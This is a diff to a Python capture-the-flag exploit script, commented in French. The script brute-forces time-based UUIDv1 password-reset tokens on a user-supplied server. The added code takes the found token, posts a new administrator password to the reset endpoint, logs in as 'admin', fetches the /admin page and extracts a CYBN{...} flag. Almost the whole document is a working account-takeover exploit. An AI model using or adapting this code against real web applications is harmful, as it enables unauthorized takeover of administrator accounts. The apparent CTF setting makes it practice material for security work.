@@ -8,6 +8,8 @@ import time
 from datetime import datetime, timezone
 from zoneinfo import ZoneInfo
 from concurrent.futures import ThreadPoolExecutor
+import winsound
+
 
 # ---------------- CONFIG ----------------
 BASE_URL = input("Base url of your server:")
@@ -20,8 +22,12 @@ RATE_PER_WORKER = 10     # req/sec per worker
 REQUEST_TIMEOUT = 2.0
 
 LOGIN_PAYLOAD = {"name": NAME, "password": PASSWORD}
+NEW_ADMIN_PASSWORD = "saucisse"
 
 UUID_EPOCH_OFFSET = 12219292800  # sec between 1582-10-15 and 1970-01-01
+
+main_sess = requests.Session()
+main_sess.headers.update({"User-Agent": "NozZy/6.9"})
 
 # ---------------- UUID UTILITIES ----------------
 def uuid1_timestamp(u: uuid.UUID) -> int:
@@ -98,9 +104,78 @@ def worker_thread(worker_id: int, sess: requests.Session, q: queue.Queue, stop_e
                 found_container['uuid'] = str(u_obj)
                 found_container['status'] = r.status_code
                 stop_event.set()
-                q.task_done()
-                print(">>> UUID trouvé immédiatement :", found_container.get('uuid'),
+                
+                print(">>> UUID trouvé :", found_container.get('uuid'),
                           "status:", found_container.get('status'))
+                q.task_done()
+                try:
+                    # 1) logout (pour être propre)
+                    try:
+                        res = sess.get(BASE_URL + "/logout", timeout=REQUEST_TIMEOUT)
+                        print(f"[post-find] GET /logout -> {res.status_code}")
+                    except Exception as e_lo:
+                        print("[post-find] logout failed:", e_lo)
+
+                    # 2) tenter de soumettre le form de reset avec le token trouvé
+                    reset_url = BASE_URL.rstrip('/') + "/reset/" + str(found_container.get('uuid'))
+                    print("[post-find] tenter POST sur reset token:", reset_url)
+
+                    reset_succeeded = False
+                    last_resp = None
+                    try:
+                        res = sess.post(reset_url, data={"password": NEW_ADMIN_PASSWORD}, allow_redirects=False, timeout=REQUEST_TIMEOUT)
+                        print(f"[post-find] POST {reset_url} -> {res.status_code}")
+                        # heuristique : si on obtient 200 ou 302, on considère que l'opération a pu réussir
+                        if res.status_code in (200, 302, 303):
+                            # on peut vérifier un texte évocateur dans le body si 200
+                            body = res.text[:400] if hasattr(res, "text") else ""
+                            if res.status_code in (302,303) or ("password" not in body.lower() and "error" not in body.lower()):
+                                reset_succeeded = True
+                    except Exception as e:
+                        print("[post-find] POST reset error with fields ->", e)
+
+                    if not reset_succeeded:
+                        print("[post-find] Aucun POST reset n'a clairement réussi (dernier status {}).".format(
+                            last_resp.status_code if last_resp is not None else "noresp"))
+                    else:
+                        print("[post-find] Reset token soumis — tentative de connexion en admin avec nouveau mot de passe.")
+
+                        # 3) Se connecter en admin avec le nouveau mot de passe (nouvelle session)
+                        try:
+                            admin_sess = requests.Session()
+                            admin_sess.headers.update(sess.headers)
+                            login_data = {"name": "admin", "password": NEW_ADMIN_PASSWORD}
+                            res = admin_sess.post(BASE_URL + "/login", data=login_data, allow_redirects=False, timeout=REQUEST_TIMEOUT)
+                            print(f"[post-find] POST /login admin -> {res.status_code}")
+                            if res.status_code in (200, 302, 303):
+                                # 4) aller sur /admin
+                                try:
+                                    res = admin_sess.get(BASE_URL + "/admin", timeout=REQUEST_TIMEOUT, allow_redirects=False)
+                                    print(f"[post-find] GET /admin -> {res.status_code}")
+                                    # optionally print a small snippet for verification
+                                    regex_flag = r'CYBN{[!-z è]+}'
+                                    res = re.search(regex_flag, res.text)
+                                    if res and res.group():
+                                        print(f"####################\n>>> Here is your flag : {res.group()}\n####################")
+                                        winsound.Beep(440, 300)
+                                        winsound.Beep(660, 300)
+                                        winsound.Beep(550, 300)
+                                        winsound.Beep(330, 300)
+                                        winsound.Beep(770, 900)
+                                    q.task_done()
+                                    print("LALALALALALALA")
+                                    found_container['admin_ok'] = True
+                                except Exception as e_admin:
+                                    print("[post-find] Erreur GET /admin:", e_admin)
+                            else:
+                                print("[post-find] Échec login admin (status {})".format(res.status_code))
+                        except Exception as e_conn:
+                            print("[post-find] Erreur lors de la tentative de login admin:", e_conn)
+
+                except Exception as e_all:
+                    print("[post-find] Erreur lors des actions post-find:", e_all)
+
+
                 return
         except Exception as e:
             print(f"[worker {worker_id}] HTTP error on {u_obj}: {e}")
@@ -115,8 +190,7 @@ def worker_thread(worker_id: int, sess: requests.Session, q: queue.Queue, stop_e
 
 # ---------------- MAIN FLOW ----------------
 def main_flow():
-    main_sess = requests.Session()
-    main_sess.headers.update({"User-Agent": "ctf-tester/1.0"})
+
     r = main_sess.post(BASE_URL + "/login", data=LOGIN_PAYLOAD, allow_redirects=False, timeout=REQUEST_TIMEOUT)
     if r.status_code not in (200, 302, 303):
         print("Login failed:", r.status_code)
@@ -169,10 +243,6 @@ def main_flow():
             while any(not f.done() for f in futures):
                 print(f"Progress: queue={q.qsize()}, attempts={attempts_counter[0]}")
                 if stop_event.is_set():
-                    # Affichage immédiat dès qu'un UUID valide est trouvé
-                    print(">>> UUID trouvé immédiatement :", found_container.get('uuid'),
-                          "status:", found_container.get('status'))
-                    # vider la queue pour arrêter rapidement les threads
                     while not q.empty():
                         try:
                             q.get_nowait()
